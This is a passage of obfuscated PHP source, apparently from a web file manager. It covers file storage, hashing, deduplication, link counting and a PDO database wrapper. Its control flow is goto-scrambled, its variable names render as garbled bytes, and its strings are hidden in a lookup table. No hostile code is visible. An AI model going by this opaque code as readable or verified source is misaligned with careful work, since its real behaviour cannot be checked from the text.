$b˜êæå†ŸÙ[$fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2152]][$cÚ…šÓ³•Õ[2149]]]; } } unset($fÑà×ÒÉ½Ò); goto BÇ‚¼…Œ; AÏÎïß©Ô: $cÚ…šÓ³•Õ =& $_SERVER[‡’¶øåüç˜]; $cÈ›Ä»Ï†… = array_unique(array_to_keyvalue($eˆí˜ Ï³®, $cÚ…šÓ³•Õ[33], $cÚ…šÓ³•Õ[2149])); $cÈ›Ä»Ï†… = array_remove_value($cÈ›Ä»Ï†…, $cÚ…šÓ³•Õ[481]); goto aõè§‰ò¦; aõè§‰ò¦: if (!$cÈ›Ä»Ï†…) { return; } foreach ($eˆí˜ Ï³® as $fÑà×ÒÉ½Ò) { if (isset($fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2152]])) { $cÈ›Ä»Ï†…[] = $fÑà×ÒÉ½Ò[$cÚ…šÓ³•Õ[2152]][$cÚ…šÓ³•Õ[2149]]; } } $b˜êæå†ŸÙ = $this->metaList($cÈ›Ä»Ï†…); goto dÀà¼¦“»‡; BÇ‚¼…Œ: } private function metaList($a‘Õê…ƒ§Ù) { goto b†ÊÆ¹¸›; dˆ‹‹—•ä²: return $f³Ûë¨îÄ ? $f³Ûë¨îÄ : array(); goto aÔ‡¼­è¨›; eºÔ­¦ƒÚš: $f³Ûë¨îÄ = Model($C²·åœ½›[2153])->where($C©‰¢ÓéÍî)->select(); $f³Ûë¨îÄ = array_to_keyvalue_group($f³Ûë¨îÄ, $C²·åœ½›[2149]); foreach ($f³Ûë¨îÄ as $EãÅ‚‘Î›„ => $bí·‡½Ü¯ë) { $d·³ÏÂÄ = array(); foreach ($bí·‡½Ü¯ë as $AïäÇŒÁ) { $d·³ÏÂÄ[$AïäÇŒÁ[$C²·åœ½›[89]]] = $AïäÇŒÁ[$C²·åœ½›[363]]; } $f³Ûë¨îÄ[$EãÅ‚‘Î›„] = $d·³ÏÂÄ; } goto dˆ‹‹—•ä²; b†ÊÆ¹¸›: $C²·åœ½› =& $_SERVER[‡’¶øåüç˜]; if (!$a‘Õê…ƒ§Ù) { return array(); } $C©‰¢ÓéÍî = array($C²·åœ½›[2149] => array($C²·åœ½›[7], $a‘Õê…ƒ§Ù)); goto eºÔ­¦ƒÚš; aÔ‡¼­è¨›: } } class FileModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\145"; protected $tableMeta = array("\x74\141\142\154\145\116\x61\155\145" => "\151\x6f\137\x66\x69\x6c\145\137\155\x65\x74\x61", "\155\x65\x74\141\106\x69\x65\154\x64" => "\146\x69\x6c\145\x49\104"); public function fileInfo($fİ²‡Ëîë¡) { $D‰•µ©£…à =& $_SERVER[‡’¶øåüç˜]; static $Aî£è‹‡İõ = array(); if (!isset($Aî£è‹‡İõ[$fİ²‡Ëîë¡])) { $EóˆèĞƒƒ× = $D‰•µ©£…à[2154]; $bÇà‚·é  = Model($D‰•µ©£…à[434])->field($EóˆèĞƒƒ×)->where(array($D‰•µ©£…à[432] => $fİ²‡Ëîë¡))->find(); $Aî£è‹‡İõ[$fİ²‡Ëîë¡] = $bÇà‚·é ; } return $Aî£è‹‡İõ[$fİ²‡Ëîë¡]; } public function addFileByContent($e×ªèèÔ«£ = '', $Bš¼å”ğ·÷ = '') { goto F·Œ¦“èî¢; F…ñÌö£…É: if (file_exists($A‰ƒµ´ï÷ø)) { @unlink($A‰ƒµ´ï÷ø); } return $Fè¿Óô±; goto E”’­÷˜ğ; F·Œ¦“èî¢: $E—³Ğê†¥ =& $_SERVER[‡’¶øåüç˜]; $f‚ö«©‡ëà = TEMP_PATH . $E—³Ğê†¥[2155]; if (!is_dir($f‚ö«©‡ëà)) { mk_dir($f‚ö«©‡ëà); } goto a©Ÿ­ìù½; a©Ÿ­ìù½: $A‰ƒµ´ï÷ø = $f‚ö«©‡ëà . $E—³Ğê†¥[2156] . rand_string(16); file_put_contents($A‰ƒµ´ï÷ø, $e×ªèèÔ«£); $Fè¿Óô± = $this->addFile($A‰ƒµ´ï÷ø, $Bš¼å”ğ·÷, !0); goto F…ñÌö£…É; E”’­÷˜ğ: } public function createFileName($E†•ŒÚ­Ò) { goto FŞí‚ğˆ±²; B•ºí›–ù¨: $FÌÅÑ³÷„Ç = $DŒØ¸Ì¯ˆÚ->pathFather($d¸Ú‘Ä†); static $Cã¢ÈÃØøğ = false; $a·ñ’èé× = $fªã‡œÜ’™[2157] . md5($FÌÅÑ³÷„Ç); goto aõÖòêœ˜È; aõÖòêœ˜È: if (!$Cã¢ÈÃØøğ && !Cache::get($a·ñ’èé×)) { $Cã¢ÈÃØøğ = !0; $Fºªàì·Ã = IO::mkdir($FÌÅÑ³÷„Ç); if (!IO::exist($Fºªàì·Ã . $fªã‡œÜ’™[2158])) { IO::mkfile($Fºªàì·Ã . $fªã‡œÜ’™[2158]); } Cache::set($a·ñ’èé×, 1, 3600 * 2); } return $d¸Ú‘Ä†; goto BË¸º›¡æ; FŞí‚ğˆ±²: $fªã‡œÜ’™ =& $_SERVER[‡’¶øåüç˜]; $DŒØ¸Ì¯ˆÚ = IO::init($fªã‡œÜ’™[8]); $d¸Ú‘Ä† = $this->makeFilePath($E†•ŒÚ­Ò, $DŒØ¸Ì¯ˆÚ); goto B•ºí›–ù¨; BË¸º›¡æ: } public function makeFilePath($c¾‰‰‰ÊÔâ, $eÄ¦Êò™ä†) { goto C’Šà™Ï²; C’Šà™Ï²: $fˆ÷Æ¤ñ£¾ =& $_SERVER[‡’¶øåüç˜]; $E„†¹ËŠÜ× = Model($fˆ÷Æ¤ñ£¾[1095])->get($fˆ÷Æ¤ñ£¾[2159]); $Dù÷Ê„ÄĞø = KodIO::defaultIO() . date($fˆ÷Æ¤ñ£¾[2160]); goto E©ƒÄ•ğÇò; E©ƒÄ•ğÇò: $eÎéÖÑÁœæ = $Dù÷Ê„ÄĞø . rand_string(5) . short_id(100); $c¾‰‰‰ÊÔâ = str_replace($fˆ÷Æ¤ñ£¾[8], $fˆ÷Æ¤ñ£¾[70], KodIO::clear($c¾‰‰‰ÊÔâ)); if (!$c¾‰‰‰ÊÔâ) { $E„†¹ËŠÜ× = $fˆ÷Æ¤ñ£¾[2161]; } goto dí¬¤‡³µ; dí¬¤‡³µ: switch ($E„†¹ËŠÜ×) { case $fˆ÷Æ¤ñ£¾[2162]: $eÎéÖÑÁœæ = $eÎéÖÑÁœæ . $fˆ÷Æ¤ñ£¾[91] . $eÄ¦Êò™ä†->ext($c¾‰‰‰ÊÔâ); if ($eÄ¦Êò™ä†->ext($c¾‰‰‰ÊÔâ) == $fˆ÷Æ¤ñ£¾[2102]) { $eÎéÖÑÁœæ .= $fˆ÷Æ¤ñ£¾[1344]; } break; case $fˆ÷Æ¤ñ£¾[2163]: goto E†ÖóøÌ´í; eŠø¦Í¬Ê²: CacheLock::lock($A—¹ Ã…ƒõ); $d‰×·ù†— = IO::fileNameAuto($Dù÷Ê„ÄĞø, $c¾‰‰‰ÊÔâ); $eÎéÖÑÁœæ = $Dù÷Ê„ÄĞø . $d‰×·ù†—; goto B¾‘É¨ÎŠ¹; B¾‘É¨ÎŠ¹: if (IO::isTypeObject($eÎéÖÑÁœæ) && !IO::isUploadServer($eÎéÖÑÁœæ)) { IO::setContent($eÎéÖÑÁœæ, $fˆ÷Æ¤ñ£¾[33]); } CacheLock::unlock($A—¹ Ã…ƒõ); break; goto BëŸ·“Ó¬µ; E†ÖóøÌ´í: $bë¤ù‘Œ™ = Model($fˆ÷Æ¤ñ£¾[1095])->get($fˆ÷Æ¤ñ£¾[1340]); $F£é’Í„Æ = substr(md5($fˆ÷Æ¤ñ£¾[1921] . $bë¤ù‘Œ™ . date($fˆ÷Æ¤ñ£¾[693])), 0, 8); $aÉßï«Ğô = KodIO::defaultDriver(); goto bŒ‘éíÀ‰¾; bŒ‘éíÀ‰¾: $Dù÷Ê„ÄĞø = $fˆ÷Æ¤ñ£¾[2164] . $aÉßï«Ğô[$fˆ÷Æ¤ñ£¾[371]] . $fˆ÷Æ¤ñ£¾[2165] . date($fˆ÷Æ¤ñ£¾[2166]) . $F£é’Í„Æ . $fˆ÷Æ¤ñ£¾[8]; if ($eÄ¦Êò™ä†->ext($c¾‰‰‰ÊÔâ) == $fˆ÷Æ¤ñ£¾[2102]) { $c¾‰‰‰ÊÔâ .= $fˆ÷Æ¤ñ£¾[1344]; } $A—¹ Ã…ƒõ = $fˆ÷Æ¤ñ£¾[2167] . $Dù÷Ê„ÄĞø . $c¾‰‰‰ÊÔâ; goto eŠø¦Í¬Ê²; BëŸ·“Ó¬µ: case $fˆ÷Æ¤ñ£¾[2161]: break; default: break; } return $eÎéÖÑÁœæ; goto FÉ†„¿óÍ©; FÉ†„¿óÍ©: } public function addFileByRemote($d³Øî‹Û“Ú, $fÙà•÷¼¡Ö, $aƒíÃ¼œ’À = array()) { goto EãëİâÌÚ¢; A¾ƒ¡ÖŠîº: if ($dÀé‚Ùºš = $this->addFileCheckExist($BÑ¯š¹è[$dùÂÈºù©[168]], $BÑ¯š¹è[$dùÂÈºù©[167]], $BÑ¯š¹è[$dùÂÈºù©[77]])) { return $dÀé‚Ùºš; } return $this->addFileData($BÑ¯š¹è); goto aÈĞÑ„´ê; aì˜Šá: $CŞ©ù®Á¢² = IO::hashMd5($d³Øî‹Û“Ú, $EÙ¦ƒ«ÉŠ); $c†¯‘­É¡Ò = KodIO::defaultDriver(); $BÑ¯š¹è = array($dùÂÈºù©[533] => IO::size($d³Øî‹Û“Ú), $dùÂÈºù©[2168] => 1, $dùÂÈºù©[398] => $fÙà•÷¼¡Ö, $dùÂÈºù©[741] => $c†¯‘­É¡Ò[$dùÂÈºù©[371]], $dùÂÈºù©[399] => $d³Øî‹Û“Ú, $dùÂÈºù©[2169] => $aƒíÃ¼œ’À[$dùÂÈºù©[168]] ? $aƒíÃ¼œ’À[$dùÂÈºù©[168]] : IO::hashSimple($d³Øî‹Û“Ú), $dùÂÈºù©[2170] => $CŞ©ù®Á¢² ? $CŞ©ù®Á¢² : $EÙ¦ƒ«ÉŠ); goto A¾ƒ¡ÖŠîº; EãëİâÌÚ¢: $dùÂÈºù© =& $_SERVER[‡’¶øåüç˜]; if (!IO::exist($d³Øî‹Û“Ú)) { return !1; } $EÙ¦ƒ«ÉŠ = $aƒíÃ¼œ’À[$dùÂÈºù©[167]] ? $aƒíÃ¼œ’À[$dùÂÈºù©[167]] : $dùÂÈºù©[33]; goto aì˜Šá; aÈĞÑ„´ê: } private function addFileData($B‘Æ‹İïë¿) { $b™š£–­‘ğ =& $_SERVER[‡’¶øåüç˜]; if (!$B‘Æ‹İïë¿) { return !1; } $B‘Æ‹İïë¿[$b™š£–­‘ğ[77]] = intval($B‘Æ‹İïë¿[$b™š£–­‘ğ[77]]); if (!$B‘Æ‹İïë¿[$b™š£–­‘ğ[77]] && strlen($B‘Æ‹İïë¿[$b™š£–­‘ğ[168]]) > 32) { $B‘Æ‹İïë¿[$b™š£–­‘ğ[77]] = intval(substr($B‘Æ‹İïë¿[$b™š£–­‘ğ[168]], 32)); } $FãËë§“×¬ = $this->add($B‘Æ‹İïë¿); return $this->find($FãËë§“×¬); } public function addFile($bß¤õ…Œç, $C¸„Ø•Şƒ, $F£‘„ÀŠŞ = false) { goto fßøä™ƒœª; C¡¤Œ¤‹ù: $E†Ÿñ•å‡ = $this->addFileMake($bß¤õ…Œç, $c—ğÕƒÖÂ, $aÉ«’£ÏÆ, $eØ×õõğìÒ, $C¸„Ø•Şƒ, $F£‘„ÀŠŞ); $b³ìò¸¥Êì = $this->addFileData($E†Ÿñ•å‡); CacheLock::unlock($b¦ ¥ß—Ëˆ); goto bÜÔœ…Ş; bÜÔœ…Ş: return $b³ìò¸¥Êì; goto A†ã¯ÔšöÑ; BÅ«ã¾·âÍ: $b¦ ¥ß—Ëˆ = $_SERVER[‡’¶øåüç˜][2171] . $eØ×õõğìÒ; CacheLock::lock($b¦ ¥ß—Ëˆ); if ($cÒ¾×Çâ«‘ = $this->addFileCheckExist($aÉ«’£ÏÆ, $eØ×õõğìÒ, $c—ğÕƒÖÂ)) { CacheLock::unlock($b¦ ¥ß—Ëˆ); return $cÒ¾×Çâ«‘; } goto C¡¤Œ¤‹ù; fßøä™ƒœª: $aÉ«’£ÏÆ = IO::hashSimple($bß¤õ…Œç); $eØ×õõğìÒ = IO::hashMd5($bß¤õ…Œç); $c—ğÕƒÖÂ = IO::size($bß¤õ…Œç); goto BÅ«ã¾·âÍ; A†ã¯ÔšöÑ: } public function addFileMake($c³öôÎà¹, $BÀ…²ŠÛ¾, $DÔùôã¤Œ, $dŒˆ÷ç–Œª, $a“‚öÚÉ‚½, $F…ÁÒ½Šòè) { goto BğˆÓó´Ç¨; e˜íËóÏ÷Ò: $d¡ƒ„×õö = KodIO::defaultDriver(); $a›¶¢Ö— = array($e½ŠÖÃì¿­[533] => $BÀ…²ŠÛ¾, $e½ŠÖÃì¿­[2168] => 1, $e½ŠÖÃì¿­[398] => $a“‚öÚÉ‚½, $e½ŠÖÃì¿­[741] => $d¡ƒ„×õö[$e½ŠÖÃì¿­[371]], $e½ŠÖÃì¿­[399] => $fĞÚ½ƒ¸ ³, $e½ŠÖÃì¿­[2169] => $DÔùôã¤Œ, $e½ŠÖÃì¿­[2170] => $dŒˆ÷ç–Œª); return $a›¶¢Ö—; goto D˜”¨—»ÛÕ; BğˆÓó´Ç¨: $e½ŠÖÃì¿­ =& $_SERVER[‡’¶øåüç˜]; $fĞÚ½ƒ¸ ³ = $this->createFileName($a“‚öÚÉ‚½); $Cßó¥˜¤ÔÊ = get_path_father($fĞÚ½ƒ¸ ³); goto c»ÑßÀŞø; c»ÑßÀŞø: $cŒ î–„ß = get_path_this($fĞÚ½ƒ¸ ³); if ($F…ÁÒ½Šòè) { $fô…â¾‰‚‚ = IO::move($c³öôÎà¹, $Cßó¥˜¤ÔÊ, !1, $cŒ î–„ß); } else { $fô…â¾‰‚‚ = IO::copy($c³öôÎà¹, $Cßó¥˜¤ÔÊ, !1, $cŒ î–„ß); } if (!$fô…â¾‰‚‚) { return !1; } goto e˜íËóÏ÷Ò; D˜”¨—»ÛÕ: } public function addFileCheckExist($A°øêÇ†, $FåÒôÕö¹É, $CÖ µâØ±ä) { $fòÉ‰–ËÇà =& $_SERVER[‡’¶øåüç˜]; $CÜ†’®«ó³ = $this->findByHash($A°øêÇ†, $FåÒôÕö¹É); if (!$CÜ†’®«ó³) { return !1; } $DåÎïÍ§µÕ = array($fòÉ‰–ËÇà[2168] => intval($CÜ†’®«ó³[$fòÉ‰–ËÇà[2172]]) + 1, $fòÉ‰–ËÇà[533] => $CÖ µâØ±ä); $this->where(array($fòÉ‰–ËÇà[432] => $CÜ†’®«ó³[$fòÉ‰–ËÇà[431]]))->save($DåÎïÍ§µÕ); return $CÜ†’®«ó³; } public function remove($a˜ßƒŠñõ) { $this->linkCountChange($a˜ßƒŠñõ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Fğà‘Ş‰²ğ) { $this->linkCountChange($Fğà‘Ş‰²ğ, !0); } public function linkCountChange($eÓÇ¬äÄß…, $eÎŞÁÎ‹) { goto a—…æÅš°‹; B§å©ÂÙõƒ: $c–›‚»º›£ = array(); foreach ($eÓÇ¬äÄß… as $fá¹—¥»÷ï) { $Eá‰ñ´šùš = $fá¹—¥»÷ï . $FˆÛİ†°‘[33]; if (!$c–›‚»º›£[$Eá‰ñ´šùš]) { $c–›‚»º›£[$Eá‰ñ´šùš] = 0; } $c–›‚»º›£[$Eá‰ñ´šùš]++; } $a‚ĞßšàÕ = array(); goto C¢í®ÃÉ; a—…æÅš°‹: $FˆÛİ†°‘ =& $_SERVER[‡’¶øåüç˜]; if (!$eÓÇ¬äÄß…) { return; } if (!is_array($eÓÇ¬äÄß…)) { $eÓÇ¬äÄß… = array($eÓÇ¬äÄß…); } goto B§å©ÂÙõƒ; C¢í®ÃÉ: foreach ($c–›‚»º›£ as $fá¹—¥»÷ï => $C’ÃÊÚò†) { $Eá‰ñ´šùš = $C’ÃÊÚò† . $FˆÛİ†°‘[33]; if (!$a‚ĞßšàÕ[$Eá‰ñ´šùš]) { $a‚ĞßšàÕ[$Eá‰ñ´šùš] = array(); } $a‚ĞßšàÕ[$Eá‰ñ´šùš][] = $fá¹—¥»÷ï; } foreach ($a‚ĞßšàÕ as $C’ÃÊÚò† => $aì…±ÖÉ©”) { if (!$aì…±ÖÉ©”) { continue; } $C’ÃÊÚò† = $eÎŞÁÎ‹ ? $C’ÃÊÚò† : -intval($C’ÃÊÚò†); $aÒÓ™Ú°ìÒ = array($FˆÛİ†°‘[431] => array($FˆÛİ†°‘[7], $aì…±ÖÉ©”)); if ($C’ÃÊÚò† < 0) { $aÒÓ™Ú°ìÒ[$FˆÛİ†°‘[2172]] = array($FˆÛİ†°‘[932], abs($C’ÃÊÚò†)); } $this->where($aÒÓ™Ú°ìÒ)->setAdd($FˆÛİ†°‘[2172], $C’ÃÊÚò†); } goto AøŠˆÏŒÌÈ; AøŠˆÏŒÌÈ: } public function findByHash($DÎŒ¤‡ˆ¤», $cé¥ÓÚŒïõ = false) { $fÀ„–†ìñõ =& $_SERVER[‡’¶øåüç˜]; if (!$DÎŒ¤‡ˆ¤» && !$cé¥ÓÚŒïõ) { return !1; } $f‘‰šé ë = array($fÀ„–†ìñõ[2169] => $DÎŒ¤‡ˆ¤»); if ($cé¥ÓÚŒïõ) { $f‘‰šé ë = array($fÀ„–†ìñõ[2170] => $cé¥ÓÚŒïõ); } return $this->order($fÀ„–†ìñõ[2173])->where($f‘‰šé ë)->find(); } public function clearEmpty($f×Éë†‡‹æ = 0) { goto B–Ã×í¡Æ; Aõ¥»“: $AÅ»¥ôÆØ‰ = $this->where($aíº­Å«›)->select(); if (!$AÅ»¥ôÆØ‰) { return; } $dÄ¢¯ãÑŠ = new Task($e½ÄØâ˜Ë®[2175], $e½ÄØâ˜Ë®[33], count($AÅ»¥ôÆØ‰)); goto eÖ®Ó—›Ï; B–Ã×í¡Æ: $e½ÄØâ˜Ë® =& $_SERVER[‡’¶øåüç˜]; $f™ä‡À«‘¦ = time() - 3600 * 24 * $f×Éë†‡‹æ; $aíº­Å«› = $e½ÄØâ˜Ë®[2174] . $f™ä‡À«‘¦; goto Aõ¥»“; eÖ®Ó—›Ï: foreach ($AÅ»¥ôÆØ‰ as $F‚õÏ¹éÛ´) { $dÄ¢¯ãÑŠ->update(1); $this->resetFile($F‚õÏ¹éÛ´); } $dÄ¢¯ãÑŠ->end(); goto E•¡‚¸™®·; E•¡‚¸™®·: } public function resetFile($FÌÔ¨ƒé) { goto AœÎ–ÅÎÃ; cˆÆ§ôš÷Ö: if ($FÌÔ¨ƒé[$D¾…„ê«¥[2172]] != $cÊŸÆ“£±Ë) { $this->where($Eù±Éì†á”)->save(array($D¾…„ê«¥[2168] => $cÊŸÆ“£±Ë)); } goto D¯æ×Ü½Ø; E°È‡‰‘Ş½: $e‘ÈÚ¦»¾ = Model($D¾…„ê«¥[2176])->where($Eù±Éì†á”)->count(); $cÊŸÆ“£±Ë = intval($dáÅ¢ä¼ËÕ) + intval($e‘ÈÚ¦»¾); if ($cÊŸÆ“£±Ë == 0) { IO::remove($FÌÔ¨ƒé[$D¾…„ê«¥[75]]); $this->where($Eù±Éì†á”)->delete(); $this->metaSet($FÌÔ¨ƒé[$D¾…„ê«¥[431]], null, null); return; } goto cˆÆ§ôš÷Ö; AœÎ–ÅÎÃ: $D¾…„ê«¥ =& $_SERVER[‡’¶øåüç˜]; $Eù±Éì†á” = array($D¾…„ê«¥[432] => $FÌÔ¨ƒé[$D¾…„ê«¥[431]]); $dáÅ¢ä¼ËÕ = Model($D¾…„ê«¥[1124])->where($Eù±Éì†á”)->count(); goto E°È‡‰‘Ş½; D¯æ×Ü½Ø: } public function storageInfo($A²„ˆò¶ò = false) { goto a¼ÅŠŸÓœ; bÎÒ¢ïğ¥ª: $D†È—°Ó… = 1; $E¸Ô£ÙŠİÜ = 0; $f„—ºôê‰­ = 5000; goto EìÙ‘ˆÜö; a¼ÅŠŸÓœ: $C¸óĞîšÍ† =& $_SERVER[‡’¶øåüç˜]; $FàäÌµö›Ç = $this->count() + 0.0; $cˆÉ…Ù£Ã‡ = 0; goto bÎÒ¢ïğ¥ª; EìÙ‘ˆÜö: for ($d¼ï£‡¹¸ = 0; $d¼ï£‡¹¸ < $FàäÌµö›Ç; $d¼ï£‡¹¸ = $d¼ï£‡¹¸ + $f„—ºôê‰­) { $E‰”èÍË Í = $this->limit($d¼ï£‡¹¸, $d¼ï£‡¹¸ + $f„—ºôê‰­)->select(); foreach ($E‰”èÍË Í as $CšëÚî¯») { $D†È—°Ó… += $CšëÚî¯»[$C¸óĞîšÍ†[77]] * $CšëÚî¯»[$C¸óĞîšÍ†[2172]]; $cˆÉ…Ù£Ã‡ += $CšëÚî¯»[$C¸óĞîšÍ†[77]] * ($CšëÚî¯»[$C¸óĞîšÍ†[2172]] - 1); $E¸Ô£ÙŠİÜ += $CšëÚî¯»[$C¸óĞîšÍ†[2172]]; } } $dÒ²Ü«¥×ã = array($C¸óĞîšÍ†[2177] => $D†È—°Ó…, $C¸óĞîšÍ†[2178] => $cˆÉ…Ù£Ã‡, $C¸óĞîšÍ†[2179] => $cˆÉ…Ù£Ã‡ / $D†È—°Ó…, $C¸óĞîšÍ†[81] => $FàäÌµö›Ç, $C¸óĞîšÍ†[2180] => $E¸Ô£ÙŠİÜ); return $dÒ²Ü«¥×ã; goto Eæù£óœŠ†; Eæù£óœŠ†: } } goto b‘²Ï¶å‹; cÖùôæËÅó: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($BáÜëó¯Æß = '') { $cŠ¡µÇ–­ =& $_SERVER[‡’¶øåüç˜]; if (!class_exists($cŠ¡µÇ–­[831])) { think_exception(think_lang($cŠ¡µÇ–­[10]) . $cŠ¡µÇ–­[832]); } if (!empty($BáÜëó¯Æß)) { $this->config = $BáÜëó¯Æß; if (empty($this->config[$cŠ¡µÇ–­[13]])) { $this->config[$cŠ¡µÇ–­[13]] = array(); } } } public function connect($AÛ‚Ã±òÙ = '', $dˆ©²—ƒ…Î = 0) { $eİ àÈòÔˆ =& $_SERVER[‡’¶øåüç˜]; if (!isset($this->linkID[$dˆ©²—ƒ…Î])) { goto Cêëİêõô‰; Cêëİêõô‰: if (empty($AÛ‚Ã±òÙ)) { $AÛ‚Ã±òÙ = $this->config; } if ($this->pconnect) { $AÛ‚Ã±òÙ[$eİ àÈòÔˆ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$dˆ©²—ƒ…Î] = new PDO($AÛ‚Ã±òÙ[$eİ àÈòÔˆ[833]], $AÛ‚Ã±òÙ[$eİ àÈòÔˆ[806]], $AÛ‚Ã±òÙ[$eİ àÈòÔˆ[807]], $AÛ‚Ã±òÙ[$eİ àÈòÔˆ[13]]); } catch (PDOException $DÚåˆ•¼º„) { think_exception($DÚåˆ•¼º„->getMessage()); } goto dâÍŒç¿Ç°; f¸ª‡Ôß„Š: try { $this->linkID[$dˆ©²—ƒ…Î]->exec($eİ àÈòÔˆ[842] . think_config($eİ àÈòÔˆ[809])); } catch (Exception $DÚåˆ•¼º„) { } $this->connected = !0; if (1 != think_config($eİ àÈòÔˆ[18])) { unset($this->config); } goto F³İÍ­¾†—; dâÍŒç¿Ç°: $this->dbType = $this->_getDsnType($AÛ‚Ã±òÙ[$eİ àÈòÔˆ[833]]); if (in_array($this->dbType, array($eİ àÈòÔˆ[834], $eİ àÈòÔˆ[835], $eİ àÈòÔˆ[836], $eİ àÈòÔˆ[837]))) { think_exception($eİ àÈòÔˆ[838] . $this->dbType . $eİ àÈòÔˆ[839] . $this->dbType . $eİ àÈòÔˆ[840]); } if (!$this->linkID[$dˆ©²—ƒ…Î]) { think_exception($eİ àÈòÔˆ[841]); } goto f¸ª‡Ôß„Š; F³İÍ­¾†—: } return $this->linkID[$dˆ©²—ƒ…Î]; } public function free() { $this->PDOStatement = null; } public function query($B»õÃšµ®ª, $CÂÎ„¹¥åì = array()) { goto c¢±–óğè; c¢±–óğè: $bõùÚç›´Â =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto AÇ³¥Ø¨Š; FÙ±èÁÉë„: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $d‚”‡œ¡Ó = $this->PDOStatement->execute($CÂÎ„¹¥åì); $this->debug(); goto c¢·ºÍ“í; AÇ³¥Ø¨Š: $this->queryStr = $B»õÃšµ®ª; if (!empty($CÂÎ„¹¥åì)) { $this->queryStr .= $bõùÚç›´Â[843] . print_r($CÂÎ„¹¥åì, !0) . $bõùÚç›´Â[844]; } if (!empty($this->PDOStatement)) { $this->free(); } goto B£ÉñâÀ‚; B£ÉñâÀ‚: think_action_status($bõùÚç›´Â[19], 1); think_status($bõùÚç›´Â[20]); $this->PDOStatement = $this->_linkID->prepare($B»õÃšµ®ª); goto FÙ±èÁÉë„; c¢·ºÍ“í: if (!1 === $d‚”‡œ¡Ó) { $this->error(); return !1; } else { return $this->getAll(); } goto d®İã”šêÔ; d®İã”šêÔ: } public function execute($cõ«•®¡Ğœ, $B»èªÉ²Ü¹ = array()) { goto C‚ò¬‰ä­–; cù¹µÇù°³: if ($this->dbType == $AïñëáŠ²ó[837]) { if (preg_match($AïñëáŠ²ó[845], $this->queryStr, $Dİ•´¬Ì“Ç)) { $this->table = think_config($AïñëáŠ²ó[846]) . str_ireplace(think_config($AïñëáŠ²ó[847]), $AïñëáŠ²ó[365], $Dİ•´¬Ì“Ç[2]); $A°®½ƒß† = (bool) $this->query($AïñëáŠ²ó[848] . strtoupper($this->table) . $AïñëáŠ²ó[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AïñëáŠ²ó[21], 1); goto FÔ¾¦Ü¾×ì; FŞË£‚Ó: $Bó›É›ŞªÏ = $this->PDOStatement->execute($B»èªÉ²Ü¹); $this->debug(); if (!1 === $Bó›É›ŞªÏ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($A°®½ƒß† || preg_match($AïñëáŠ²ó[849], $cõ«•®¡Ğœ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto dŒ÷¢¹ƒŒø; FÔ¾¦Ü¾×ì: think_status($AïñëáŠ²ó[20]); $this->PDOStatement = $this->_linkID->prepare($cõ«•®¡Ğœ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto FŞË£‚Ó; C‚ò¬‰ä­–: $AïñëáŠ²ó =& $_SERVER[‡’¶øåüç˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto C¦ß·°‹â; C¦ß·°‹â: $this->queryStr = $cõ«•®¡Ğœ; if (!empty($B»èªÉ²Ü¹)) { $this->queryStr .= $AïñëáŠ²ó[843] . print_r($B»èªÉ²Ü¹, !0) . $AïñëáŠ²ó[844]; } $A°®½ƒß† = !1; goto cù¹µÇù°³; dŒ÷¢¹ƒŒø: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d ª³¹è±™ = $this->_linkID->commit(); $this->transTimes = 0; if (!$d ª³¹è±™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Bã’×˜ƒ§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Bã’×˜ƒ§) { $this->error(); return !1; } } return !0; } private function getAll() { $F›•ƒ¥š—‰ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($F›•ƒ¥š—‰); return $F›•ƒ¥š—‰; } public function getFields($Eª™Ÿ†Éè¢) { goto fŒ¡•°‹´; AÙÃ“âÅ«: $B®›«æğÈÕ = $this->query($dº¨ğŠ‡); $A³ØåîÚ‚Î = array(); if ($B®›«æğÈÕ) { foreach ($B®›«æğÈÕ as $bˆ Æ„™İĞ => $e¯ÕÊ‚¾) { $e¯ÕÊ‚¾ = array_change_key_case($e¯ÕÊ‚¾); $e¯ÕÊ‚¾[$C°õ»…î‘[28]] = isset($e¯ÕÊ‚¾[$C°õ»…î‘[28]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[28]] : $C°õ»…î‘[365]; $e¯ÕÊ‚¾[$C°õ»…î‘[29]] = isset($e¯ÕÊ‚¾[$C°õ»…î‘[29]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[29]] : $C°õ»…î‘[365]; $D †­Òõ¹ = isset($e¯ÕÊ‚¾[$C°õ»…î‘[265]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[265]] : $e¯ÕÊ‚¾[$C°õ»…î‘[28]]; $A³ØåîÚ‚Î[$D †­Òõ¹] = array($C°õ»…î‘[28] => $D †­Òõ¹, $C°õ»…î‘[29] => $e¯ÕÊ‚¾[$C°õ»…î‘[29]], $C°õ»…î‘[31] => (bool) (isset($e¯ÕÊ‚¾[$C°õ»…î‘[99]]) && $e¯ÕÊ‚¾[$C°õ»…î‘[99]] === $C°õ»…î‘[33] || isset($e¯ÕÊ‚¾[$C°õ»…î‘[31]]) && $e¯ÕÊ‚¾[$C°õ»…î‘[31]] === $C°õ»…î‘[33]), $C°õ»…î‘[34] => isset($e¯ÕÊ‚¾[$C°õ»…î‘[34]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[34]] : (isset($e¯ÕÊ‚¾[$C°õ»…î‘[53]]) ? $e¯ÕÊ‚¾[$C°õ»…î‘[53]] : $C°õ»…î‘[365]), $C°õ»…î‘[36] => isset($e¯ÕÊ‚¾[$C°õ»…î‘[89]]) 